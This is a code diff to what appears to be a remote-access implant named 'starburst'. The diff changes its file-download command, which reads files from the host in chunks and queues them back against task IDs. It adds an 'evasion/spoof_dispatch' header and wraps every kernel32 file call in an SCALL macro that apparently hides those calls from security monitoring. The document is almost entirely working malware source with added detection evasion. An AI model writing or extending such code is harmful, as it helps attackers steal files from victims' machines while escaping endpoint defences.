@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <base64.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_DOWNLOAD
 
@@ -29,9 +30,9 @@ auto declfn starburst::cmd_download(
     memory::copy( path_buf, path, copy_len );
 
     wchar_t wpath[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, path_buf, -1, wpath, 520 );
 
-    HANDLE h_file = inst.kernel32.CreateFileW(
+    HANDLE h_file = (HANDLE)SCALL( inst, kernel32.CreateFileW,
         wpath, GENERIC_READ, FILE_SHARE_READ,
         nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr
     );
@@ -43,8 +44,8 @@ auto declfn starburst::cmd_download(
     }
 
     LARGE_INTEGER file_size;
-    if ( !inst.kernel32.GetFileSizeEx( h_file, &file_size ) ) {
-        inst.kernel32.CloseHandle( h_file );
+    if ( !SCALL( inst, kernel32.GetFileSizeEx, h_file, &file_size ) ) {
+        SCALL( inst, kernel32.CloseHandle, h_file );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetFileSizeEx failed" ) ) );
         return;
@@ -64,7 +65,7 @@ auto declfn starburst::cmd_download(
     }
 
     if ( slot < 0 ) {
-        inst.kernel32.CloseHandle( h_file );
+        SCALL( inst, kernel32.CloseHandle, h_file );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "too many pending downloads" ) ) );
         return;
@@ -220,7 +221,7 @@ auto declfn starburst::cmd_download_resp(
         // file-based download
         auto chunk_buf = static_cast<uint8_t*>( inst.heap_alloc( CHUNK_SIZE ) );
         if ( !chunk_buf ) {
-            inst.kernel32.CloseHandle( dl.h_file );
+            SCALL( inst, kernel32.CloseHandle, dl.h_file );
             dl.active = false;
             queue_response( inst, task_uuid, RESPONSE_ERROR,
                 symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
@@ -229,7 +230,7 @@ auto declfn starburst::cmd_download_resp(
 
         for ( uint32_t chunk_num = 1; chunk_num <= dl.total_chunks; chunk_num++ ) {
             DWORD bytes_read = 0;
-            if ( !inst.kernel32.ReadFile( dl.h_file, chunk_buf, CHUNK_SIZE, &bytes_read, nullptr ) || bytes_read == 0 ) {
+            if ( !(BOOL)SCALL( inst, kernel32.ReadFile, dl.h_file, chunk_buf, CHUNK_SIZE, &bytes_read, nullptr ) || bytes_read == 0 ) {
                 break;
             }
 
@@ -273,7 +274,7 @@ auto declfn starburst::cmd_download_resp(
         }
 
         inst.heap_free( chunk_buf );
-        inst.kernel32.CloseHandle( dl.h_file );
+        SCALL( inst, kernel32.CloseHandle, dl.h_file );
     }
 
     dl.active = false;
